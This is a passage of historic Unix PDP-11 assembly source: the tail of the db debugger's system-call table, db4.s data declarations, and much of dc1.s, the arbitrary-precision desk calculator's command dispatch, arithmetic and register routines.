	1f; 0; .data; 1:<fork\0>; .text
	1f; 2; .data; 1:<read\0>; .text
	1f; 2; .data; 1:<write\0>; .text
	1f; 2; .data; 1:<open\0>; .text
	1f; 0; .data; 1:<close\0>; .text
	1f; 0; .data; 1:<wait\0>; .text
	1f; 2; .data; 1:<creat\0>; .text
	1f; 2; .data; 1:<link\0>; .text
	1f; 1; .data; 1:<unlink\0>; .text
	1f; 2; .data; 1:<exec\0>; .text
	1f; 1; .data; 1:<chdir\0>; .text
	1f; 0; .data; 1:<time\0>; .text
	1f; 1; .data; 1:<makdir\0>; .text
	1f; 2; .data; 1:<chmod\0>; .text
	1f; 2; .data; 1:<chown\0>; .text
	1f; 1; .data; 1:<break\0>; .text
	1f; 2; .data; 1:<stat\0>; .text
	1f; 2; .data; 1:<seek\0>; .text
	1f; 2; .data; 1:<tell\0>; .text
	1f; 2; .data; 1:<mount\0>; .text
	1f; 1; .data; 1:<umount\0>; .text
	1f; 0; .data; 1:<setuid\0>; .text
	1f; 0; .data; 1:<getuid\0>; .text
	1f; 0; .data; 1:<stime\0>; .text
	1f; 1; .data; 1:<quit\0>; .text
	1f; 1; .data; 1:<intr\0>; .text
	1f; 1; .data; 1:<fstat\0>; .text
	1f; 1; .data; 1:<emt\0>; .text
	1f; 1; .data; 1:<smdate\0>; .text
	1f; 1; .data; 1:<stty\0>; .text
	1f; 1; .data; 1:<gtty\0>; .text
	1f; 1; .data; 1:<ilgins\0>; .text
	1f; 0; .data; 1:<hog\0>; .text
	1f; 0; .data; 1:<sleep\0>; .text
	1f; 0; .data; 1:<sync\0>; .text
	1f; 0; .data; 1:<kill\0>; .text
	1f; 0; .data; 1:<switches\0>; .text
	1f; 0; .data; 1:<boot\0>; .text
esystab:
.data
.even
.text

specl6: / unknown
	jsr	pc,psp
	mov	(sp)+,r0
	jsr	pc,printo
	rts	pc
-- /usr/source/s1/db4.s mode=0100664 uid=3 gid=3 atime=174922733 mtime=169260570 --
/ db4 -- debugger

maxsym = 24000.
core:
   <core\0>
a.out:
   <a.out\0>
.even
zero:	0
.bss
regbuf:
	.=.+1024.
sigp	= regbuf+310
txtsiz	= regbuf+322
datsiz	= regbuf+324
stksiz	= regbuf+326
rtxtsiz: .=.+2
.data
objmagic: 407
nobjmagic: 410
namsiz:	nambuf
incdot: 2
nlcom: '/

	.bss

starmod:.=.+2
symbol:	.=.+10.
getoff:	.=.+2
namstrt: .=.+2
bytemod: .=.+2
savsp: .=.+2
error: .=.+2
ttyfin: .=.+2
dbfin: .=.+2
symfin:	.=.+2
curfin:	.=.+2
dbfout: .=.+2
ch: .=.+2
lastop: .=.+2
addres: .=.+2
taddr: .=.+2
adrflg: .=.+2
fpsr:	.=.+2
och:	.=.+2
dot: .=.+2
count: .=.+2
syscnt: .=.+2
temp: .=.+2
temp1: .=.+2
obuf: .=.+8.
inbuf: .=.+128.
nambuf:	.=.+20

-- /usr/source/s1/dc1.s mode=0110664 uid=3 gid=3 atime=174922743 mtime=169260570 --
.globl log2
.globl	getchar
.globl	lookchar
.globl	fsfile
.globl	seekchar
.globl	backspace
.globl	putchar
.globl	alterchar
.globl	move
.globl	rewind
.globl	create
.globl	zero
.globl	allocate
.globl	release
.globl	collect
.globl	w, r, a, l
/
	cmp	(sp)+,$2
	blo	1f
	tst	(sp)+
	mov	(sp)+,0f
	cmpb	*0f,$'-
	beq	8f
	sys	0; 9f
.data
9:
	sys	open; 0:.=.+2; 0
.text
	bec	2f
	mov	$1,r0
	sys	write; 4f; 5f-4f
	sys	exit

/
4:	<Input file.\n>
5:	.even
/
2:
	mov	r0,source
1:
	sys	signal; 2; 1
	ror	r0
	bcs	1f
	sys	signal; 2; case177
1:
8:
	clr	delflag
	mov	$pdl,r5
/
	mov	$10.,r0
	jsr	pc,log2
	mov	r0,log10
	mov	$1,r0
	jsr	pc,allocate
	mov	r1,scalptr
	clr	r0
	jsr	pc,putchar
	clr	r0
	jsr	pc,allocate
	mov	r1,basptr
	mov	$10.,r0
	jsr	pc,putchar
	mov	$1,r0
	jsr	pc,allocate
	mov	r1,inbas
	mov	$10.,r0
	jsr	pc,putchar
	mov	$1,r0
	jsr	pc,allocate
	mov	$10.,r0
	jsr	pc,putchar
	mov	r1,tenptr
	clr	r0
	jsr	pc,allocate
	mov	r1,chptr
	clr	r0
	jsr	pc,allocate
	mov	r1,strptr
	mov	$1,r0
	jsr	pc,allocate
	mov	$2,r0
	jsr	pc,putchar
	mov	r1,sqtemp
	clr	r0
	jsr	pc,allocate
	mov	r1,divxyz
loop:
	tst	delflag
	bne	in177
	mov	sp,errstack
	jsr	pc,readc
	mov	$casetab,r1
1:	tst	(r1)+
	beq	2f
	cmp	r0,(r1)+
	bne	1b
	jmp	*-4(r1)
2:	jmp	eh
/
/
/	case for new line (which is special for apl box)
/
case012:
	br	loop
/
/
/	case q for quit
/
case161:
	cmp	readptr,$readstack+2
	blos	1f
	mov	*readptr,r1
	beq	2f
	jsr	pc,release
2:
	sub	$2,readptr
	mov	*readptr,r1
	beq	2f
	jsr	pc,release
2:
	sub	$2,readptr
	jmp	loop
1:
	sys	exit
/
/
/	case Q for controlled quit
/
case121:
	jsr	pc,pop
	jes	eh
	jsr	pc,length
	cmp	r0,$2
	jhi	eh1
	jsr	pc,rewind
	jsr	pc,getchar
	jmi	eh1
	jsr	pc,release
1:
	cmp	readptr,$readstack
	jlos	eh
	mov	*readptr,r1
	beq	2f
	jsr	pc,release
2:
	sub	$2,readptr
	sob	r0,1b
	jbr	loop
/
/
/	case of delete character
/
case177:
	sys	signal; 2; case177
	mov	$1,delflag
	mov	r0,-(sp)
	mov	2(sp),r0
	cmp	-6(r0),$sys+read
	bne	1f
	sub	$6,2(sp)
	clr	delflag
1:
	mov	(sp)+,r0
	2			/rti
/
in177:
	mov	$' ,ch
	mov	$1,r0
	sys	write; 1f; 1
	clr delflag
	jmp	eh
/
.bss
delflag: .=.+2
.text
1:	<\n>
	.even
/
/
/	case digit
/
case060:
	movb	r0,savec
	jsr	pc,readin
	jsr	pc,push
	br	loop
/
/
/	case _ for negative numbers
/
case137:
	jsr	pc,readin
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk
	dec	w(r1)
	jsr	pc,chsign
	mov	savk,r0
	jsr	pc,putchar
	jsr	pc,push
	jbr	loop
/
/
/	case screamer
/
case041:
	jsr	pc,in041
	jbr	loop
/
in041:
	jsr	pc,readc
	cmp	r0,$'<
	jeq	in74a
	cmp	r0,$'=
	jeq	in75a
	cmp	r0,$'>
	jeq	in76a
/
	mov	$field,r1
	movb	r0,(r1)+
1:
	jsr	pc,readc
	movb	r0,(r1)+
	cmpb	r0,$'\n
	bne	1b
	clrb	(r1)+
/
	sys	fork
		br	9f
	sys	wait
	mov	$1,r0
	sys	write; screamer; 2
	rts	pc
9:	sys	exec; 6f; 8f
	sys	exit
.data
8:	6f; 7f; field; 0
6:	</bin/sh\0>
7:	<-c\0>
screamer: <!\n>
	.even
.bss
field:	.=.+70.
.text
/
/
/	case d for duplicate
/
case144:
	cmp	r5,$pdl
	jeq	eh
	clr	r0
	jsr	pc,allocate
	mov	-2(r5),r0
	jsr	pc,move
	jsr	pc,push
	jmp	loop
/
/
/	case z for stack size
/
case172:
	clr	r0
	jsr	pc,allocate
	mov	r5,r3
	sub	$pdl,r3
	asr	r3
2:
	beq	2f
	clr	r2
	dvd	$100.,r2
	mov	r3,r0
	jsr	pc,putchar
	mov	r2,r3
	br	2b
2:
	clr	r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
/
/
/	case c for flush
/
case143:
2:	jsr	pc,pop
	jes	loop
	jsr	pc,release
	br	2b
/
/	case s for save
/
case163:
	tst	sfree
	bne	1f
	jsr	pc,sinit
1:
	jsr	pc,readc
	cmp	r5,$pdl
	bne	2f
	movb	$'s,ch
	jmp	eh
2:
	clr	r2
	cmpb	r0,$128.	/ check for array
	blo	1f
	inc	r2
1:
	asl	r0
	mov	stable(r0),r1
	beq	2f
	mov	r1,r0
	mov	2(r0),r1
	tst	r2
	beq	4f
	mov	r1,-(sp)	/ have array - release elements
	jsr	pc,rewind
1:
	mov	(sp),r1
3:
	jsr	pc,getword
	bes	1f
	tst	r0
	beq	3b
	mov	r0,r1
	jsr	pc,release
	br	1b
1:
	mov	(sp)+,r1
4:
	jsr	pc,release
	jsr	pc,pop
	mov	r1,2(r0)
	jbr	loop
2:
	mov	sfree,stable(r0)
	mov	stable(r0),r0
	mov	(r0),sfree
	beq	symout
	clr	(r0)
	jsr	pc,pop
	mov	r1,2(r0)
	jmp	loop
/
symout:
	mov	$1,r0
	sys	write; 7f; 8f-7f
	jmp	reset
/
7:	<Symbol table overflow.\n>
8:	.even
/
/
sinit:
	mov	$sfree+4,r0
1:
	mov	r0,-4(r0)
	clr	-2(r0)
	add	$4,r0
	cmp	r0,$sfend
	blos	1b
	clr	sfend-4
	rts	pc
/
/
.bss
sfree:	.=.+512.
sfend:
.text
/
/
/	case S for save
/
case123:
	tst	sfree
	bne	1f
	jsr	pc,sinit
1:
	jsr	pc,readc
	cmp	r5,$pdl
	bne	2f
	movb	$'S,ch
	jbr	eh
2:
	clr	r3
	cmp	r0,$128.	/ check for array
	blo	1f
	inc	r3
1:
	asl	r0
	mov	stable(r0),r1
	beq	2f
	mov	sfree,r2
	mov	(r2),sfree
	beq	symout
	mov	stable(r0),(r2)
	mov	r2,stable(r0)
	jsr	pc,pop
	tst	r3
	beq	1f
	jsr	pc,length	/ to make auto arrays work
	cmp	r0,$1
	bhi	1f
	jsr	pc,zero
1:
	mov	r1,2(r2)
	jbr	loop
2:
	mov	sfree,stable(r0)
	mov	stable(r0),r2
	mov	(r2),sfree
	beq	symout
	clr	(r2)
	jsr	pc,pop
	tst	r3
	beq	1f
	jsr	pc,length
	cmp	r0,$1
	bhi	1f
	jsr	pc,zero
1:
	mov	r1,2(r2)
	jbr	loop
/
/
/	case l for load
/
case154:
	jsr	pc,in154
	jmp	loop
/
in154:
	jsr	pc,readc
	clr	r2
	cmp	r0,$128.	/ check for array
	blo	1f
	inc	r2
1:
	asl	r0
	mov	stable(r0),r1
	beq	1f
	mov	2(r1),r1
	mov	r1,-(sp)
	jsr	pc,length
	jsr	pc,allocate
	tst	r2
	beq	2f
	mov	r1,-(sp)	/ have array - copy elements
	mov	2(sp),r1
	jsr	pc,rewind
3:
	mov	2(sp),r1
	jsr	pc,getword
	bes	3f
	tst	r0
	beq	4f
	mov	r0,-(sp)
	mov	r0,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	(sp)+,r0
	jsr	pc,move
	mov	r1,r0
	mov	(sp),r1
	jsr	pc,putword
	br	3b
4:
	clr	r0
	mov	(sp),r1
	jsr	pc,putword
	br	3b
3:
	mov	(sp)+,r1
	jsr	pc,push
	tst	(sp)+
	rts	pc
2:
	mov	(sp)+,r0
	jsr	pc,move
	jsr	pc,push
	rts	pc
1:
	clr	r0
	jsr	pc,allocate
	jsr	pc,putword
	jsr	pc,push
	rts	pc
/
/	case : for save array
/
case072:
	tst	sfree
	bne	1f
	jsr	pc,sinit
1:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	jsr	pc,fsfile
	jsr	pc,backspace
	tst	r0
	jmi	eh1	/ neg. index
	jsr	pc,length
	cmp	r0,$2
	jhi	eh1	/ index too high
	jsr	pc,fsfile
	clr	r3
	cmp	r0,$1
	blo	1f
	beq	2f
	jsr	pc,backspace
	mov	r0,r3
	mul	$100.,r3
2:
	jsr	pc,backspace
	add	r0,r3
	cmp	r3,$2048.
	jhis	eh1	/ index too high
	asl	r3
1:
	jsr	pc,release
	jsr	pc,readc
	cmp	r5,$pdl
	bne	2f
	movb	$':,ch
	jmp	eh
2:
	asl	r0
	mov	stable(r0),r1
	beq	2f
	mov	r1,-(sp)
	mov	2(r1),r1
	mov	l(r1),r0
	sub	a(r1),r0
	sub	$2,r0
	cmp	r3,r0
	blos	1f
	mov	r1,-(sp)	/ need more space
	mov	r3,r0
	add	$2,r0
	jsr	pc,allocate
	jsr	pc,zero
	mov	(sp)+,r0
	jsr	pc,move
	mov	r1,-(sp)
	mov	r0,r1
	jsr	pc,release
	mov	(sp)+,r1
1:
	mov	r1,-(sp)
	mov	r3,r0
	jsr	pc,seekchar
	jsr	pc,getword
	bes	1f
	sub	$2,r(r1)
	tst	r0
	beq	1f
	mov	r0,r1
	jsr	pc,release
1:
	jsr	pc,pop
	jes	eh
	mov	r1,r0
	mov	(sp)+,r1
	jsr	pc,alterchar
	swab	r0
	jsr	pc,alterchar
	mov	(sp)+,r0
	mov	r1,2(r0)
	jmp	loop
2:
	mov	sfree,stable(r0)
	mov	stable(r0),r0
	mov	(r0),sfree
	jeq	symout
	clr	(r0)
	mov	r0,-(sp)
	mov	r3,r0
	add	$2,r0
	jsr	pc,allocate
	jsr	pc,zero
	sub	$2,r0
	jsr	pc,seekchar
	mov	r1,-(sp)
	br	1b
/
/	case ; for load array
/
case073:
	tst	sfree
	bne	1f
	jsr	pc,sinit
1:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	jsr	pc,fsfile
	jsr	pc,backspace
	tst	r0
	jmi	eh1	/ neg. index
	jsr	pc,length
	cmp	r0,$2
	jhi	eh1
	jsr	pc,fsfile
	clr	r3
	cmp	r0,$1
	blo	1f
	beq	2f
	jsr	pc,backspace
	mov	r0,r3
	mul	$100.,r3
2:
	jsr	pc,backspace
	add	r0,r3
	cmp	r3,$2048.
	jhis	eh1	/ index too high
	asl	r3
1:
	jsr	pc,release
	jsr	pc,readc
	asl	r0
	mov	stable(r0),r1
	beq	1f
	mov	2(r1),r1
	jsr	pc,length
	sub	$2,r0
	cmp	r3,r0
	bhi	1f	/ element not here
	mov	r3,r0
	jsr	pc,seekchar
	jsr	pc,getword
	tst	r0
	beq	1f
	mov	r0,r1
	mov	r1,-(sp)
	jsr	pc,length
	jsr	pc,allocate
	mov	(sp)+,r0
	jsr	pc,move
	jsr	pc,push
	jmp	loop
1:
	clr	r0
	jsr	pc,allocate
	jsr	pc,putword
	jsr	pc,push
	jmp	loop
/
/
/	case L for load
/
case114:
	jsr	pc,readc
	clr	r2
	cmp	r0,$128.	/ check for array
	blo	1f
	inc	r2
1:
	asl	r0
	mov	stable(r0),r1
	beq	4f
	mov	(r1),stable(r0)
	mov	sfree,(r1)
	mov	r1,sfree
	mov	2(r1),r1
	tst	r2
	beq	2f
	mov	r1,-(sp)	/ have array - assume a throw away
	jsr	pc,rewind
1:
	mov	(sp),r1
3:
	jsr	pc,getword
	bes	1f
	tst	r0
	beq	3b
	mov	r0,r1
	jsr	pc,release
	br	1b
1:
	mov	(sp)+,r1
2:
	jsr	pc,push
	jbr	loop
4:
	movb	$'L,ch
	jbr	eh
/
/
/	case - for subtract
/
case055:
	jsr	pc,in055
	jmp	loop
/
in055:
	jsr	pc,pop
	jes	eh
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk
	dec	w(r1)
	jsr	pc,chsign
	mov	savk,r0
	jsr	pc,putchar
	jsr	pc,push
	br	in053
/
/
/	case + for add
/
case053:
	jsr	pc,in053
	jmp	loop
/
in053:
	jsr	pc,eqk
	mov	$add3,r0
	jsr	pc,binop
	jsr	pc,pop
	mov	savk,r0
	jsr	pc,putchar
	jsr	pc,push
	rts	pc
/
/
/	case * for multiply
/
case052:
	jsr	pc,pop
	jes	eh
	mov	r1,-(sp)
	jsr	pc,pop
	jec	1f
	mov	(sp)+,r1
	jsr	pc,push
	jbr	eh
1:
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk2
	dec	w(r1)
	mov	r1,r2
	mov	(sp)+,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk1
	dec	w(r1)
	mov	r1,r3
	mov	$mul3,r0
	jsr	pc,binop
	jsr	pc,pop
	cmp	savk1,savk2
	blo	1f
	mov	savk1,r2
	br	2f
1:
	mov	savk2,r2
2:
	cmp	r2,k
	bhis	1f
	mov	k,r2
1:
	add	savk2,savk1
	cmp	r2,savk1
	bhis	1f
	mov	r2,-(sp)
	neg	r2
	add	savk1,r2
	jsr	pc,removc
	mov	(sp)+,r0
2:
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
1:
	mov	savk1,r0
	br	2b
/
/	r1 = string
/	r2 = count
/	result returned in r1 (old r1 released)
/
removc:
	mov	r1,-(sp)
	jsr	pc,rewind
1:
	cmp	r2,$1
	blos	1f
	jsr	pc,getchar
	sub	$2,r2
	br	1b
1:
	mov	$2,r0
	jsr	pc,allocate
	mov	r1,-(sp)
1:
	mov	2(sp),r1
	jsr	pc,getchar
	bes	1f
	mov	(sp),r1
	jsr	pc,putchar
	mov	r1,(sp)
	br	1b
1:
	cmp	r2,$1
	bne	1f
	mov	(sp),r3
	mov	tenptr,r2
	jsr	pc,div3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,release
1:
	mov	2(sp),r1
	jsr	pc,release
	mov	(sp)+,r1
	tst	(sp)+
	rts	pc
/
/	case / for divide
/
case057:
	jsr	pc,dscale
	mov	$div3,r0
	jsr	pc,binop
	mov	r4,r1
	jsr	pc,release
	jsr	pc,pop
	mov	savk,r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
/
/
dscale:
	jsr	pc,pop
	jes	eh
	mov	r1,-(sp)
	jsr	pc,pop
	bec	1f
	mov	(sp)+,r1
	jsr	pc,push
	jmp	eh
1:
	mov	r1,-(sp)
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk1
	dec	w(r1)
	jsr	pc,rewind
	mov	2(sp),r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk2
	dec	w(r1)
	mov	k,r2
	sub	savk1,r2
	add	savk2,r2
	mov	k,savk
	mov	(sp)+,r1
	tst	r2
	bmi	1f
	jsr	pc,add0
	br	2f
1:
	neg	r2
	jsr	pc,removc
2:
	mov	r1,r3
	mov	(sp)+,r2
	rts	pc
/
/
/	case % for remaindering
/
case045:
	jsr	pc,dscale
	mov	$div3,r0
	jsr	pc,binop
	jsr	pc,pop
	jsr	pc,release
	mov	r4,r1
	mov	savk1,r0
	add	k,r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
/
/
binop:
	jsr	pc,(r0)
	jsr	pc,push
	mov	r2,r1
	jsr	pc,release
	mov	r3,r1
	jsr	pc,release
	rts	pc
/
eqk:
	jsr	pc,pop
	jes	eh
	mov	r1,-(sp)
	jsr	pc,pop
	bec	1f
	mov	(sp)+,r1
	jsr	pc,push
	jbr	eh
1:
	mov	r1,-(sp)
	mov	2(sp),r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk1
	dec	w(r1)
	mov	(sp),r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk2
	dec	w(r1)
	cmp	r0,savk1
	beq	1f
	blo	2f
	mov	savk2,savk
	mov	r0,r2
	sub	savk1,r2
	mov	2(sp),r1
	jsr	pc,add0
	mov	r1,2(sp)
	br	4f
2:
	mov	savk1,r2
	sub	savk2,r2
	mov	(sp),r1
	jsr	pc,add0
	mov	r1,(sp)
1:
	mov	savk1,savk
4:
	mov	2(sp),r3
	mov	(sp)+,r2
	tst	(sp)+
	rts	pc
.bss
savk1:	.=.+2
savk2:	.=.+2
savk:	.=.+2
.text
/
/
/	r2 = count
/	r1 = ptr
/	returns ptr in r1
add0:
	mov	r1,-(sp)
	jsr	pc,length
	jsr	pc,allocate
	clr	r0
1:
	cmp	r2,$1
	blos	1f
	jsr	pc,putchar
	sub	$2,r2
	br	1b
1:
	mov	r1,-(sp)
	mov	2(sp),r1
	jsr	pc,rewind
1:
	jsr	pc,getchar
	bes	1f
	mov	(sp),r1
	jsr	pc,putchar
	mov	r1,(sp)
	mov	2(sp),r1
	br	1b
1:
	cmp	r2,$1
	bne	1f
	mov	(sp),r3
	mov	tenptr,r2
	jsr	pc,mul3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
1:
	mov	2(sp),r1
	jsr	pc,release
	mov	(sp)+,r1
	tst	(sp)+
	rts	pc
/	case i for input base
/
case151:
	jsr	pc,in151
	jmp	loop
/
in151:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	mov	r1,-(sp)
	mov	inbas,r1
	mov	(sp)+,inbas
	jsr	pc,release
	rts	pc
case111:
	mov	inbas,r1
	jsr	pc,length
	inc	r0
	jsr	pc,allocate
	mov	inbas,r0
	jsr	pc,move
	clr	r0
	jsr	pc,putchar	/scale
	jsr	pc,push
	jmp	loop
/
.bss
inbas:	.=.+2
.data
/
/
/	case o for output base
/
case157:
	jsr	pc,in157
	jmp	loop
/
in157:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	mov	r1,-(sp)
	jsr	pc,length
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,move
	jsr	pc,fsfile
	jsr	pc,length
1:
	cmp	r0,$1
	beq	1f
	jsr	pc,backspace
	bpl	2f
	jsr	pc,chsign
	jsr	pc,length
	br	1b
2:
	clr	sav
	mov	r0,-(sp)
2:
	jsr	pc,backspace
	bes	2f
	mov	(sp),r2
	clr	r3
	mul	$100.,r2
	add	r0,r3
	mov	r3,(sp)
	tst	sav
	beq	3f
	mov	r2,r0
	clr	r3
	mov	sav,r2
	mul	$100.,r2
	mov	r3,sav
	add	r0,sav
	br	2b
3:
	mov	r2,sav
	br	2b
2:
	mov	(sp)+,r0
	tst	sav
	beq	2f
	mov	sav,r0
	jsr	pc,log2
	add	$16.,r0
	mov	r0,logo
	br	3f
1:
	jsr	pc,backspace
2:
	tst	r0
	bpl	1f
	mov	$15.,logo
	br	3f
1:
	jsr	pc,log2
	mov	r0,logo
3:
	jsr	pc,release
	mov	basptr,r1
	jsr	pc,release
	mov	(sp),basptr
/
/	set field widths for output
/	and set output digit handling routines
/
	mov	(sp),r1
	mov	$bigout,outdit
	jsr	pc,length
	cmp	r0,$1.
	bne	2f
	jsr	pc,fsfile
	jsr	pc,backspace
	cmp	r0,$16.
	bhi	2f
	mov	$hexout,outdit
2:
	jsr	pc,length
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,move
	clr	(sp)
	jsr	pc,fsfile
	jsr	pc,backspace
	bpl	2f
	add	$1.,(sp)
	jsr	pc,chsign
2:
	mov	r1,r2
	mov	$1,r0
	jsr	pc,allocate
	mov	$-1,r0
	jsr	pc,putchar
	mov	r1,r3
	jsr	pc,add3
	jsr	pc,length
	asl	r0
	add	r0,(sp)
	jsr	pc,fsfile
	jsr	pc,backspace
	cmp	r0,$9.
	blos	2f
	add	$1,(sp)
2:
	jsr	pc,release
	mov	r2,r1
	jsr	pc,release
	mov	r3,r1
	jsr	pc,release
	mov	(sp)+,fw
	mov	fw,fw1
	dec	fw1
	cmp	outdit,$hexout
	bne	2f
	mov	$1,fw
	clr	fw1
2:
	mov	$70.,ll
	cmp	fw,$70.
	blo 9f; rts pc; 9:
	mov	$70.,r1
	clr	r0
	dvd	fw,r0
	mov	r0,r1
	mpy	fw,r1
	mov	r1,ll
	rts	pc
case117:
	mov	basptr,r1
	jsr	pc,length
	inc	r0
	jsr	pc,allocate
	mov	basptr,r0
	jsr	pc,move
	clr	r0
	jsr	pc,putchar	/scale
	jsr	pc,push
	jmp	loop
/
.data
fw:	1			/field width for digits
fw1:	0
ll:	70.			/line length
.text
/
/
/	case k for skale factor
/
case153:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	mov	w(r1),r0
	sub	a(r1),r0
	cmp	r0,$1
	jhi	eh1
	jsr	pc,rewind
	jsr	pc,getchar
	jmi	eh1
	mov	r0,k
	mov	r1,-(sp)
	mov	scalptr,r1
	jsr	pc,release
	mov	(sp)+,scalptr
	jmp	loop
/
case113:
	mov	scalptr,r1
	jsr	pc,length
	inc	r0
	jsr	pc,allocate
	mov	scalptr,r0
	jsr	pc,move
	clr	r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
scalint:
	jsr	pc,fsfile
	jsr	pc,backspace
	dec	w(r1)
	mov	r0,r2
	jsr	pc,removc
	rts	pc
/
/	case ^ for exponentiation
/
case136:
	jsr	pc,pop
	jes	eh
	jsr	pc,scalint
	jsr	pc,fsfile
	jsr	pc,backspace
	tst	r0
	bge	1f
	inc	negexp
	jsr	pc,chsign
1:
	jsr	pc,length
	cmp	r0,$3
	jhis	eh1
	mov	r1,r3
	jsr	pc,pop
	jes	eh
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk
	dec	w(r1)
	mov	r1,r2
	jsr	pc,exp3
	mov	r1,-(sp)
	mov	r2,r1
	jsr	pc,release
	mov	r3,r1
	jsr	pc,rewind
	jsr	pc,getchar
	mov	r0,-(sp)
	jsr	pc,getchar
	bes	2f
	mov	r0,r1
	mul	$100.,r1
	add	(sp)+,r1
	br	3f
2:
	mov	(sp)+,r1
3:
	mul	savk,r1
	mov	r1,r2
	mov	r3,r1
	jsr	pc,release
	tst	negexp
	bne	4f
	cmp	k,savk
	blo	1f
	mov	k,r3
	br	2f
1:
	mov	savk,r3
2:
	cmp	r3,r2
	bhis	4f
	sub	r3,r2
	mov	(sp)+,r1
	mov	r3,-(sp)
	jsr	pc,removc
	mov	(sp)+,r0
	jsr	pc,putchar
	jsr	pc,push
	br	3f
4:
	mov	(sp)+,r1
	mov	r2,r0
	jsr	pc,putchar
	jsr	pc,push
3:
	tst	negexp
	jeq	loop
	clr	negexp
	jsr	pc,pop
	mov	r1,-(sp)
	mov	$2,r0
	jsr	pc,allocate
	mov	$1,r0
	jsr	pc,putchar
	clr	r0
	jsr	pc,putchar
	jsr	pc,push
	mov	(sp)+,r1
	jsr	pc,push
	jmp	case057
/
.bss
sav:	.=.+2
negexp:	.=.+2
.text
/
/	case v for square root
/
case166:
	jsr	pc,pop
	jes	eh
/
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk
	dec	w(r1)
	mov	w(r1),r2
	sub	a(r1),r2
	tst	r2
	beq	sqz
	jsr	pc,backspace
	tst	r0
	jmi	eh1
	mov	k,r2
	asl	r2
	sub	savk,r2
	beq	1f
	blo	2f
	jsr	pc,add0
	br	1f
2:
	neg	r2
	jsr	pc,removc
1:
	jsr	pc,sqrt
	mov	k,r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
/
/
sqz:
	mov	savk,r0
	jsr	pc,putchar
	jsr	pc,push
	jmp	loop
.bss
sqtemp:	.=.+2
.text
/
/
/	case [ for subroutine definition
/
case133:
	clr	-(sp)
	clr	r0
	jsr	pc,allocate
	jsr	pc,push
1:	jsr	pc,readc
	cmp	r0,$']
	bne	3f
	tst	(sp)
	beq	1f
	dec	(sp)
	br	2f
3:
	cmp	r0,$'[
	bne	2f
	inc	(sp)
2:
	jsr	pc,putchar
	br	1b
/
1:	tst	(sp)+
	jmp	loop
/
/
/	case x for execute top of stack
/
case170:
	jsr	pc,in170
	jmp	loop
/
in170:
	jsr	pc,pop
	jes	eh
	mov	r1,-(sp)
	tst	*readptr
	beq	1f
	mov	*readptr,r1
	cmp	r(r1),w(r1)
	bne	1f
	jsr	pc,release
	br	2f
1:
	add	$2,readptr
	cmp	readptr,$readtop
	bhis	1f
2:	mov	(sp)+,r1
	mov	r1,*readptr
	beq	2f
	jsr	pc,rewind
	rts	pc
2:
	jsr	pc,readc
	cmp	r0,$'\n
	beq	3f
	mov	r0,savec
3:
	rts	pc
1:
nderr:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	reset
1:	<Nesting depth.\n>
2:	.even
/
.data
readptr: readstack
.bss
readstack: .=.+100.
readtop:
.text
/
/	case ? for apl box function
/
case077:
	add	$2,readptr
	cmp	readptr,$readtop
	bhis	nderr
	clr	*readptr
in077:
	mov	source,-(sp)
	clr	source
	jsr	pc,readc
	cmp	r0,$'!
	bne	1f
	jsr	pc,in041
	mov	(sp)+,source
	br	in077
1:
	mov	r0,savec
	clr	r0
	jsr	pc,allocate
2:
	jsr	pc,readc
	jsr	pc,putchar
1:
	jsr	pc,readc
	jsr	pc,putchar
	cmp	r0,$'\\
	beq	2b
	cmp	r0,$'\n
	bne	1b
	mov	(sp)+,source
	mov	r1,*readptr
	jmp	loop
/
/
/	case < for conditional execution
/
case074:
	jsr	pc,in074
	ble	neg074
	jmp	aff074
/
/
/	case !< for conditional execution
/
in74a:
	jsr	pc,in074
	bgt	inneg
	jmp	inaff
/
in074:
	jsr	pc,in055	/go subtract
	jsr	pc,pop
	jsr	pc,length
	tst	r0
	beq	1f
	jsr	pc,fsfile
	jsr	pc,backspace
	jsr	pc,backspace
	tst	r0
1:
	rts	pc
/
aff074:
	jsr	pc,release
	jsr	pc,in154	/load from register
	jmp	case170
/
neg074:
	jsr	pc,release
	jsr	pc,readc
	jmp	loop
/
/
/	case = for conditional execution
/
case075:
	jsr	pc,in074
	beq	aff074
	jmp	neg074
/
/
/	case != for conditional execution
/
in75a:
	jsr	pc,in074
	bne	inaff
	jmp	inneg
/
/
/	case > for conditional execution
/
case076:
	jsr	pc,in074
	bge	neg074
	jmp	aff074
/
/
/	case !> for conditional execution
/
in76a:
	jsr	pc,in074
	blt	inneg
	jmp	inaff
/
inaff:
	jsr	pc,release
	jsr	pc,in154
	jsr	pc,in170
	rts	pc
/
inneg:
	jsr	pc,release
	jsr	pc,readc
	rts	pc
/
err:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	reset
1:	<Fatal error\n>; 2: .even
/
eh1:
	jsr	pc,release
eh:
	movb	ch,1f+2
	mov	$1,r0
	sys	write; 1f; 2f-1f
	mov	$readstack,readptr
	mov	errstack,sp
	jmp	loop
.data
1:	<(  ) ?\n>
2:	.even
.text
/
/
/	routine to read and convert a number from the
